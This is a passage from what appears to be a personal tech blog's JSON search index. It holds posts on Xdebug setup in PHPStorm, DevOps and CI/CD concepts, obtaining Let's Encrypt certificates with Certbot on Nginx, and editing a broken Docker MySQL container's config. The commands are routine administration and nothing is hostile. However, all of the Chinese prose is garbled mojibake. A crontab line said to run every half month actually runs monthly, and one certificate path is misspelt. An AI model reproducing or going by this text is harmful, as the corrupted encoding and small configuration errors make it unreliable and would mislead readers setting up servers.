File-&gt;Setting-&gt;PHP-&gt;Serverï¼Œè¿™ä¸‰ä¸ªå‚æ•°çš„å€¼å’Œphp.iniä¸­çš„ä¿æŒä¸€è‡´ã€‚ é…ç½®åŸŸå è¿™é‡Œæ ¹æ®å®é™…æƒ…å†µé…ç½®ï¼Œæˆ‘æœ¬åœ°ä½¿ç”¨80 ç«¯å£ä½œä¸ºé¡¹ç›®è®¿é—®ç«¯å£ï¼Œæ‰€ä»¥è¿™é‡Œå¡«çš„æ˜¯80ã€‚ é…ç½®è°ƒè¯•å‚æ•° Run-&gt;Web Server Debug Validationï¼Œæ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸã€‚ ç¡®ä¿é¡¹ç›®æ–‡ä»¶è·¯å¾„å’Œæœ¬åœ°åŸŸåèƒ½æ­£å¸¸è®¿é—®ï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸åˆ™èƒ½çœ‹åˆ°è¾“å‡ºã€‚ WindowsWindows ä¸‹çš„PHPStorm é…ç½®å’ŒMac å‡ ä¹å·®ä¸å¤šï¼Œä¿è¯ä¸€ä¸‹å‡ ç‚¹æ˜¯æ­£å¸¸çš„åŸºæœ¬ä¸Šæ²¡å•¥é—®é¢˜ã€‚ ç¡®ä¿PHPStorm å¯ç”¨äº†å¯¹åº”ç‰ˆæœ¬çš„ Xdebugã€‚ PHPStorm çš„è°ƒè¯•ä¿¡æ¯ä¸php.iniæ–‡ä»¶ä¸­ä¿æŒä¸€è‡´ã€‚ é¡¹ç›®æ–‡ä»¶è·¯å¾„å’Œæœ¬åœ°åŸŸåèƒ½æ­£å¸¸è®¿é—®ã€‚ Xdebug è°ƒè¯•ç«¯å£å¹¶éä¸€å®šè¦ç”¨9001ï¼Œåªè¦ä¿æŒphp.iniä¸PHPStorm çš„ä¿æŒä¸€è‡´å°±å¥½äº†ã€‚ åœ¨PHPStormä¸­ä½¿ç”¨Xdebugæœ‰ä¸¤ç§æ–¹å¼ä½¿ç”¨Xdebugï¼š ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­å¼€å§‹è°ƒè¯•ã€‚ é€šè¿‡åœ¨è¯·æ±‚åœ°å€ä¸­é™„åŠ xdebug çš„è¯·æ±‚å‚æ•°æ¥è°ƒè¯•ï¼Œè¿™æ‹›é€šå¸¸ç”¨æ¥å¤„ç†ä¸€äº›å‰åç«¯åˆ†ç¦»çš„è”åŠ¨è°ƒè¯•ã€‚ å‚è€ƒé“¾æ¥ PhpStrom Xdebug é…ç½®ä¸ä½¿ç”¨ å¦‚ä½•åœ¨Mac ä¸Šä¸ºä¸åŒç‰ˆæœ¬çš„PHP å¼€å¯Xdebug é…ç½®Xdebug-å®˜æ–¹æ•™ç¨‹ Xdebug å®˜ç½‘ Xdebug æ£€æµ‹å·¥å…·","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"}]},{"title":"ä»€ä¹ˆæ˜¯DevOpsã€CIã€CDã€K8S","slug":"what-is-devops-ci-cd-k8s","date":"2020-09-12T14:40:00.000Z","updated":"2020-09-14T01:44:10.169Z","comments":true,"path":"what-is-devops-ci-cd-k8s/","link":"","permalink":"https://www.0x2beace.com/what-is-devops-ci-cd-k8s/","excerpt":"ä¹‹æ‰€ä»¥è¦å†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºå‰æ®µæ—¶é—´åœ¨ä½¿ç”¨ gitlab æäº¤ä»£ç æ—¶ï¼Œé‡åˆ°äº†ç‚¹é—®é¢˜ã€‚ gitlab æç¤ºæˆ‘ commit å¤±è´¥ã€‚è·Ÿè¿›äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ç­”æ¡ˆã€‚","text":"ä¹‹æ‰€ä»¥è¦å†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºå‰æ®µæ—¶é—´åœ¨ä½¿ç”¨ gitlab æäº¤ä»£ç æ—¶ï¼Œé‡åˆ°äº†ç‚¹é—®é¢˜ã€‚ gitlab æç¤ºæˆ‘ commit å¤±è´¥ã€‚è·Ÿè¿›äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ç­”æ¡ˆã€‚ åªæ˜¯äº†è§£åˆ°ä¸€ä¸ªå«åš CI/CDçš„ä¸œè¥¿ã€‚åæ¥åˆå»¶ä¼¸æ‰©å±•åˆ°DevOpsã€K8S è¿™äº›æ–°æ¦‚å¿µã€‚ ä»€ä¹ˆæ˜¯ DevOpsï¼Ÿå¦‚é¢˜ï¼Œä»€ä¹ˆæ˜¯ DevOps ï¼Ÿæ ¹æ®å­—é¢æ„æ€ç†è§£å°±æ˜¯ï¼šDev + Opsï¼Œå¼€å‘ï¼ˆDevelopmentï¼‰å’Œè¿è¥ï¼ˆOperationsï¼‰è¿™ä¸¤ä¸ªé¢†åŸŸçš„åˆå¹¶ã€‚ å°±æˆ‘ä¸ªäººçš„ç†è§£ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¦‚å¿µã€ä¸€ç§æ€ç»´ï¼Œæ˜¯ä¸€ç§é€šåŠ›åˆä½œï¼Œå…±åŒè§£å†³é—®é¢˜çš„æ–¹å¼ã€‚ è¿™é‡Œæˆ‘å°±ä¸è¿½æ ¹æº¯æºå»è§£é‡Šä¸ºä»€ä¹ˆè¦åˆå¹¶å¼€å‘å’Œè¿è¥äº†ï¼Œå› ä¸ºå†å²åŸå› ï¼Œæ€»æ˜¯å­˜åœ¨ç€è¿™æ ·çš„é—®é¢˜ã€‚å…·ä½“çœ‹å‚è€ƒé“¾æ¥ä¸€ã€‚ DevOps ä¹Ÿä¸ä»…ä»…æ˜¯ä¸€ç§è½¯ä»¶çš„éƒ¨ç½²æ–¹æ³•ã€‚å®ƒé€šè¿‡ä¸€ç§å…¨æ–°çš„æ–¹å¼ï¼Œæ¥æ€è€ƒå¦‚ä½•è®©è½¯ä»¶çš„ä½œè€…ï¼ˆå¼€å‘éƒ¨é—¨ï¼‰å’Œè¿è¥è€…ï¼ˆè¿è¥éƒ¨é—¨ï¼‰è¿›è¡Œåˆä½œä¸ååŒã€‚ä½¿ç”¨äº†DevOpsæ¨¡å‹ä¹‹åï¼Œä¼šä½¿ä¸¤ä¸ªéƒ¨é—¨æ›´å¥½çš„äº¤äº’ã€‚å…¶ä¸­ï¼Œè‡ªåŠ¨åŒ–éƒ¨ç½²çš„æ¦‚å¿µå°±æ˜¯ä»ä¸­äº§ç”Ÿçš„ã€‚ ä»€ä¹ˆæ˜¯ CI/CDï¼ŸGitlab çš„CI/CDåˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ æ˜¨å¤©å¤§è‡´äº†è§£äº†ä¸‹ Gitlab CI/CDï¼Œä¸æ˜¯å¾ˆæ˜ç™½ï¼Œä½†è§‰å¾—å¾ˆå‰å®³ã€‚é¦–å…ˆæ¥çœ‹ä¸‹å®˜æ–¹æ–‡æ¡£çš„ç®€ä»‹ï¼š è½¯ä»¶å¼€å‘çš„è¿ç»­æ–¹æ³•åŸºäºè‡ªåŠ¨æ‰§è¡Œè„šæœ¬ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‡å°‘åœ¨å¼€å‘åº”ç”¨ç¨‹åºæ—¶å¼•å…¥é”™è¯¯çš„å¯èƒ½æ€§ã€‚ä»æ–°ä»£ç çš„å¼€å‘åˆ°éƒ¨ç½²ï¼Œå®ƒä»¬éœ€è¦è¾ƒå°‘çš„äººä¸ºå¹²é¢„ç”šè‡³æ ¹æœ¬ä¸éœ€è¦å¹²é¢„ã€‚å®ƒæ¶‰åŠåœ¨æ¯æ¬¡å°è¿­ä»£ä¸­ä¸æ–­æ„å»ºï¼Œæµ‹è¯•å’Œéƒ¨ç½²ä»£ç æ›´æ”¹ï¼Œä»è€Œå‡å°‘åŸºäºæœ‰ç¼ºé™·æˆ–å¤±è´¥çš„å…ˆå‰ç‰ˆæœ¬å¼€å‘æ–°ä»£ç çš„æœºä¼šã€‚ è¿™é‡Œæœ‰ä¸‰ç§ä¸»è¦çš„æ–¹æ³•ï¼Œæ ¹æ®æœ€é€‚åˆä½ çš„ç­–ç•¥è¿›è¡Œé€‰æ‹©ã€‚ æŒç»­é›†æˆè€ƒè™‘ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå…¶ä»£ç å­˜å‚¨åœ¨Gitlabä¸­çš„å­˜å‚¨åº“ä¸­ã€‚å¼€å‘äººå‘˜æ¯å¤©å¤šæ¬¡æ¨é€ä»£ç æ›´æ”¹ï¼Œå¯¹äºæ¯æ¬¡æ¨åŠ¨åˆ°å­˜å‚¨åº“ï¼Œéƒ½å¯ä»¥åˆ›å»ºä¸€ç»„è„šæœ¬æ¥è‡ªåŠ¨æ„å»ºå’Œæµ‹è¯•åº”ç”¨ç¨‹åºï¼Œä»è€Œå‡å°‘å‘åº”ç”¨ç¨‹åºå¼•å…¥é”™è¯¯çš„å¯èƒ½æ€§ã€‚è¿™ç§æ–¹æ³•è¢«ç§°ä¸ºï¼šæŒç»­é›†æˆï¼ˆContinuous Integrationï¼‰ æŒç»­äº¤ä»˜æŒç»­äº¤ä»˜ Continuous Deliveryæ˜¯æŒç»­é›†æˆçš„ä¸€ä¸ªæ­¥éª¤ï¼Œåº”ç”¨ç¨‹åºä¸ä»…åœ¨æ¨é€åˆ°ä»£ç åº“çš„æ¯ä¸ªä»£ç æ›´æ”¹æ—¶éƒ½æ„å»ºå’Œæµ‹è¯•ï¼Œè€Œä¸”ä½œä¸ºä¸€ä¸ªé¢å¤–çš„æ­¥éª¤ï¼Œå®ƒä¹Ÿä¼šè¿ç»­éƒ¨ç½²ï¼Œå°½ç®¡éƒ¨ç½²æ˜¯æ‰‹åŠ¨è§¦å‘çš„ã€‚ æŒç»­éƒ¨ç½²æŒç»­éƒ¨ç½² Continuous Deploymentä¹Ÿæ˜¯æŒç»­é›†æˆçš„åˆä¸€æ­¥ï¼Œç±»ä¼¼äºæŒç»­äº¤ä»˜ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œä¸å¿…æ‰‹åŠ¨éƒ¨ç½²åº”ç”¨ç¨‹åºï¼Œè€Œæ˜¯å°†å…¶è®¾ç½®ä¸ºè‡ªåŠ¨éƒ¨ç½²ã€‚å®Œå…¨ä¸éœ€è¦äººå·¥å¹²é¢„å°±å¯ä»¥éƒ¨ç½²åº”ç”¨ç¨‹åºã€‚ ä»€ä¹ˆæ˜¯ K8Sï¼Ÿå‚è€ƒé“¾æ¥ ä»€ä¹ˆæ˜¯DevOpsï¼Ÿâ€“ç¨‹åºå‘˜å°ç° DevOps åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ ä½¿ç”¨GitLabä»‹ç»CI / CD Gitlab CI/CD å¿«é€Ÿå…¥é—¨ Gitlab CI/CD å…¥é—¨ Gitlab CI ç¤ºä¾‹ Docker é›†æˆ Git Runner æ˜¯ä»€ä¹ˆï¼Ÿ å®‰è£…Gitlab Runner ä»€ä¹ˆæ˜¯ Auto DevOps K8S æ˜¯ä»€ä¹ˆï¼ŸçŸ¥ä¹ ä¸ºä»€ä¹ˆ K8S å¾ˆé…· K8S ä¸­æ–‡æŒ‡å— ä¸€æ–‡äº†è§£ K8S æ˜¯ä»€ä¹ˆï¼Ÿ","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"}]},{"title":"å¦‚ä½•è‡ªåŠ¨ç”³è¯·å…è´¹çš„SSL è¯ä¹¦","slug":"how-to-automatically-apply-for-a-free-ssl-certificate","date":"2020-09-11T08:18:20.000Z","updated":"2020-12-21T13:39:01.225Z","comments":true,"path":"how-to-automatically-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/","excerpt":"ä¸Šæ¬¡ä»‹ç»äº†å¦‚ä½•é€šè¿‡ç¬¬ä¸‰æ–¹ç½‘ç«™ç”³è¯·å…è´¹çš„SSL è¯ä¹¦ï¼Œä½†æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œä¸‰ä¸ªæœˆä¹‹ååˆéœ€è¦å†æ¬¡ç”³è¯·ï¼Œè®°å¾—è¿˜å¥½ï¼Œå¦‚æœå¿˜äº†å¯èƒ½è¿˜ä¼šé€ æˆä¸å¿…è¦çš„æŸå¤±ã€‚","text":"ä¸Šæ¬¡ä»‹ç»äº†å¦‚ä½•é€šè¿‡ç¬¬ä¸‰æ–¹ç½‘ç«™ç”³è¯·å…è´¹çš„SSL è¯ä¹¦ï¼Œä½†æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œä¸‰ä¸ªæœˆä¹‹ååˆéœ€è¦å†æ¬¡ç”³è¯·ï¼Œè®°å¾—è¿˜å¥½ï¼Œå¦‚æœå¿˜äº†å¯èƒ½è¿˜ä¼šé€ æˆä¸å¿…è¦çš„æŸå¤±ã€‚ Letâ€™s Encrypt æ˜¯ä¸€ä¸ªå…è´¹æä¾›çš„SSL è¯ä¹¦çš„CAï¼Œè™½ç„¶æ¯æ¬¡ç­¾å‘çš„æœ‰æ•ˆæœŸéƒ½åªæœ‰ä¸‰ä¸ªæœˆï¼Œä½†æ˜¯å‘è¯æ˜¯è‡ªåŠ¨åŒ–çš„ï¼Œå‘è¯é€Ÿåº¦è¾ƒå¿«ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è„šæœ¬æ¥è‡ªåŠ¨ç»­ç­¾ï¼Œä¸ºä¸ªäººç½‘ç«™ä½¿ç”¨HTTPSæä¾›äº†ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ Letâ€™s Encrypt ï¼ˆä»¥ä¸‹ç®€ç§°LEï¼‰çš„è¯ä¹¦ç­¾å‘ä¸»è¦ä½¿ç”¨åŸºäº ACMEåè®® çš„è¯ä¹¦è‡ªåŠ¨ç®¡ç†å®¢æˆ·ç«¯æ¥å®ç°ã€‚ LEå®˜æ–¹æ¨èçš„å®¢æˆ·ç«¯æ˜¯ Certbot ï¼Œæœ¬æ–‡ä¸­å°±æ˜¯ä½¿ç”¨ Certbot æ¥è·å–å’Œç»­ç­¾è¯ä¹¦ã€‚ LE æ˜¯å¦‚ä½•è‡ªåŠ¨ç­¾å‘è¯ä¹¦çš„å‡è®¾ç°åœ¨è¦ç”³è¯·CA è¯ä¹¦çš„åŸŸåæ˜¯ example.comã€‚ é¦–å…ˆç”±WebServerï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬ç”¨æˆ·ç«¯çš„æœåŠ¡å™¨ï¼‰çš„ç®¡ç†å®¢æˆ·ç«¯ï¼ˆå¦‚Certbotï¼‰å‘é€è¯·æ±‚åˆ°LEï¼Œè®©LEæ¥éªŒè¯å®¢æˆ·ç«¯æ˜¯å¦çœŸçš„æ§åˆ¶example.comè¿™ä¸ªåŸŸåï¼Œæ¥ä¸‹æ¥LEä¼šæå‡ºä¸€äº›éªŒè¯åŠ¨ä½œï¼ˆåŸæ–‡challengesï¼‰ï¼Œæ¯”å¦‚è®©å®¢æˆ·ç«¯åœ¨ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„è·¯å¾„ä¸Šæ”¾æŒ‡å®šçš„æ–‡ä»¶ã€‚åŒæ—¶ï¼ŒLEè¿˜ä¼šå‘å‡ºä¸€ä¸ªéšæœºæ•°ï¼Œå®¢æˆ·ç«¯éœ€è¦ç”¨è¿™ä¸ªéšæœºæ•°å’Œå®¢æˆ·ç«¯è‡ªå·±çš„ç§é’¥æ¥è¿›è¡Œç­¾åã€‚ WebServerä¸Šçš„å®¢æˆ·ç«¯å®ŒæˆLEæŒ‡å®šçš„åŸŸåéªŒè¯åŠ¨ä½œå¹¶ä¸”å°†åŠ å¯†åçš„ç­¾ååï¼Œå†æ¬¡å‘é€è¯·æ±‚åˆ°LEè¦æ±‚éªŒè¯ï¼ŒLEä¼šéªŒè¯å‘å›æ¥çš„ç­¾åæ˜¯å¦æ­£ç¡®ï¼Œå¹¶ä¸”éªŒè¯åŸŸåéªŒè¯åŠ¨ä½œæ˜¯å¦å®Œæˆï¼Œå¦‚ä¸‹è½½æŒ‡å®šçš„æ–‡ä»¶å¹¶ä¸”åˆ¤æ–­æ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚ è¿™äº›éªŒè¯éƒ½å®Œæˆä»¥åï¼Œå¯ä»¥ç”³è¯·è¯ä¹¦äº†ã€‚ å®ŒæˆéªŒè¯åï¼Œå®¢æˆ·ç«¯ç”Ÿæˆè‡ªå·±çš„ç§é’¥ä»¥åŠ Certificate Signing Requestï¼ˆCSRï¼‰ å‘é€åˆ°LEæœåŠ¡å™¨ï¼ŒLEæœåŠ¡å™¨ä¼šå°†CAè¯ä¹¦ï¼ˆä¹Ÿæ˜¯å…¬é’¥ï¼‰å‘æ”¾åˆ°ä½ çš„æœåŠ¡å™¨ã€‚ è¿™æ ·å°±å®Œæˆäº†CAè¯ä¹¦çš„è‡ªåŠ¨åŒ–å‘æ”¾äº†ã€‚ ä½¿ç”¨Certbot è·å–è¯ä¹¦LE çš„CA è¯ä¹¦å‘æ”¾åŸç†çœ‹ç€è¿˜æŒºéº»çƒ¦çš„ï¼Œä½†å¦‚æœä½¿ç”¨ Certbot å®¢æˆ·ç«¯ï¼Œæ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯æŒºç®€å•çš„ã€‚ åœ¨æ­£å¼è·å–è¯ä¹¦ä¹‹å‰ï¼Œæ¨èå…ˆå»Certbot å®˜ç½‘é€‰æ‹©é€‚åˆè‡ªå·±çš„ç³»ç»Ÿç¯å¢ƒã€‚ æˆ‘è¿™è¾¹ç³»ç»Ÿç¯å¢ƒæ˜¯Nginx + Ubuntu 18.04 LTSï¼Œæ‰€ä»¥ä¸‹é¢ä»‹ç»çš„å®‰è£…æµç¨‹åªé€‚ç”¨äºUbuntu + Nginxã€‚ 1. å®‰è£… snapsnap æ˜¯Canonicalå…¬å¸å‘å¸ƒçš„å…¨æ–°çš„è½¯ä»¶åŒ…ç®¡ç†æ–¹å¼ï¼Œå®ƒç±»ä¼¼ä¸€ä¸ªå®¹å™¨æ‹¥æœ‰ä¸€ä¸ªåº”ç”¨ç¨‹åºæ‰€æœ‰çš„æ–‡ä»¶å’Œåº“ï¼Œå„ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´å®Œå…¨ç‹¬ç«‹ã€‚ä½¿ç”¨snap åŒ…çš„å¥½å¤„å°±æ˜¯å®ƒè§£å†³äº†åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¾èµ–é—®é¢˜ï¼Œä½¿åº”ç”¨ç¨‹åºä¹‹é—´æ›´å®¹æ˜“ç®¡ç†ã€‚ä½†æ˜¯ç”±æ­¤å¸¦æ¥çš„é—®é¢˜å°±æ˜¯å®ƒå ç”¨æ›´å¤šçš„ç£ç›˜ç©ºé—´ã€‚ 12$ sudo apt update$ sudo apt install snapd 2. å®‰è£… certbotåœ¨å®‰è£… Certbot ä¹‹å‰ï¼Œæœ€å¥½å…ˆç§»é™¤å†å²å¿«ç…§ã€‚ 1$ sudo apt-get remove certbot è¿›è¡Œå®‰è£…ï¼š 1$ sudo snap install --classic certbot 3. ç”Ÿæˆè¯ä¹¦å®‰è£…å®Œæˆä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯ç”Ÿæˆè¯ä¹¦äº†ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ç”Ÿæˆè¯ä¹¦å¹¶è‡ªåŠ¨é…ç½® 1$ sudo certbot --nginx ç”Ÿæˆè¯ä¹¦æ‰‹åŠ¨é…ç½® 1$ sudo certbot certonly --nginx æˆ‘é€‰æ‹©çš„æ˜¯æ‰‹åŠ¨é…ç½®ï¼Œå¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š è¾“å…¥å¸¸ç”¨é‚®ç®±ï¼Œç”¨æ¥æ¥æ”¶é€šçŸ¥å’Œæ¢å¤å¯†é’¥ã€‚ åŒæ„ä½¿ç”¨åè®®ã€‚ è¾“å…¥éœ€è¦åšæˆæƒçš„åŸŸåï¼Œå¤šä¸ªåŸŸåç”¨ç©ºæ ¼éš”å¼€ã€‚ ç­‰å¾…éªŒè¯é€šè¿‡ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š certbotä¼šè‡ªåŠ¨æ£€æµ‹æœ¬åœ°Nginx çš„å¯ç”¨åŸŸåï¼ˆæ²¡æœ‰é…ç½®server_name çš„åŸŸåä¸ä¼šè¢«æ£€æµ‹åˆ°ï¼‰ å¦‚æœå…¶ä¸­æŸä¸ªåŸŸåéªŒè¯å¤±è´¥ï¼Œåˆ™ä¸ä¼šç”Ÿæˆå¯†é’¥åŠè¯ä¹¦ ä¸€åˆ‡æ­£å¸¸çš„è¯ï¼Œå¯ä»¥çœ‹åˆ°/etc/letsencrypt/live/your_sites/ç›®å½•ä¸‹å¤šäº†å››ä¸ªæ–‡ä»¶ï¼š cert.pem ï¼š å…¬é’¥ï¼ŒæœåŠ¡å™¨è¯ä¹¦ chain.pem ï¼š ä¸­é—´è¯ä¹¦ fullchain.pem ï¼š å‰ä¸¤ä¸ªçš„åˆé›† privkey.pem ï¼š ç§é’¥ å…¶ä¸­é…ç½®Nginx SSL åªéœ€è¦ç”¨åˆ°fullchain.pem å’Œprivkey.pemï¼š 123456789server &#123; listen 443 ssl; server_name www.example.com; ssl on; ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.exampl.com&#x2F;fullchain.pem; ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.example.com&#x2F;privkey.pem; ...&#125; è‡³æ­¤ï¼Œå°±å·²ç»å®Œæˆäº†ç”Ÿæˆè¯ä¹¦åˆ°é…ç½®çš„å…¨éƒ¨è¿‡ç¨‹äº†ã€‚ è‡ªåŠ¨ç»­ç­¾å¦‚æœå¿«è¦åˆ°æœŸäº†ï¼Œå¯ä»¥ä½¿ç”¨certbot renewå¯¹è¯ä¹¦è¿›è¡Œæ›´æ–°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¯ä¹¦å°šæœªè¿‡æœŸï¼Œåˆ™ä¸ä¼šæ›´æ–°ã€‚ å¯ä»¥é…åˆconrtabä½¿ç”¨ï¼Œæ¯åŠä¸ªæœˆçš„å‡Œæ™¨ä¸‰ç‚¹è‡ªåŠ¨ç»­ç­¾ä¸€æ¬¡ã€‚ 1$ 0 3 15 * * certbot renew å‚è€ƒé“¾æ¥ Letâ€™s Encryptå…è´¹SSLè¯ä¹¦è·å–ä»¥åŠè‡ªåŠ¨ç»­ç­¾","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"}]},{"title":"å½“ Docker å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨æ—¶å¦‚ä½•ä¿®æ”¹é…ç½®æ–‡ä»¶","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1","date":"2020-09-10T13:12:13.000Z","updated":"2020-09-10T13:13:32.922Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","excerpt":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ é—®é¢˜æè¿°ï¼šå› ä¸ºé”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´å®¹å™¨è¿è¡Œå¼‚å¸¸ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œé€šå¸¸æƒ…å†µä¸‹åªæœ‰è¿›å…¥å®¹å™¨æ‰èƒ½ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨ä¸èƒ½è¿›å…¥å®¹å™¨çš„æƒ…å†µä¸‹è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ","text":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ é—®é¢˜æè¿°ï¼šå› ä¸ºé”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´å®¹å™¨è¿è¡Œå¼‚å¸¸ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œé€šå¸¸æƒ…å†µä¸‹åªæœ‰è¿›å…¥å®¹å™¨æ‰èƒ½ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨ä¸èƒ½è¿›å…¥å®¹å™¨çš„æƒ…å†µä¸‹è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸¤ç§æ–¹å¼å»ä¿®æ”¹ï¼š2. Docker å®¹å™¨çš„é…ç½®æ–‡ä»¶ä¸€èˆ¬åœ¨ /var/lib/docker/overlay/ç›®å½•ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°è¯¥ç›®å½•ä¸‹å¯¹åº”çš„é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚2. æŠŠå®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°ä¸»æœºä¸­ï¼Œä¿®æ”¹å®Œä¹‹åï¼Œå†ç§»åŠ¨åˆ°å®¹å™¨ä¸­ã€‚ æ–¹å¼ä¸€ æŸ¥è¯¢æ—¥å¿— 123456docker logs &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting ç”±äºå¼‚å¸¸æ—¥å¿—å¯ä»¥å¾—çŸ¥æ˜¯å› ä¸ºæˆ‘å°†relay-log å†™æˆäº† realy å¯¼è‡´å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨ã€‚ æŸ¥æ‰¾æ–‡ä»¶ 123456$ find &#x2F; -name mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf è¿™é‡Œå¯èƒ½ä¼šå‡ºç°å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºæ¯ä¸€æ¬¡é‡å¯Mysql å®¹å™¨éƒ½ä¼šä¿ç•™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥ç†è®ºä¸Šï¼Œç›´æ¥ä¿®æ”¹ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå°±æ˜¯å½“å‰Mysql æ‰€ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ã€‚ ä¿®æ”¹é…ç½®æ–‡ä»¶ é‡å¯å®¹å™¨å³å¯ã€‚ æ–¹å¼äºŒå¦‚æœç¬¬ä¸€ç§æ–¹å¼æ²¡ç”Ÿæ•ˆï¼Œé‚£å¯ä»¥å°è¯•ç¬¬äºŒç§æ–¹å¼ã€‚ å¤åˆ¶å®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶åˆ°ä¸»æœºï¼š 123# è¯­æ³•ï¼šdocker cp &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt; 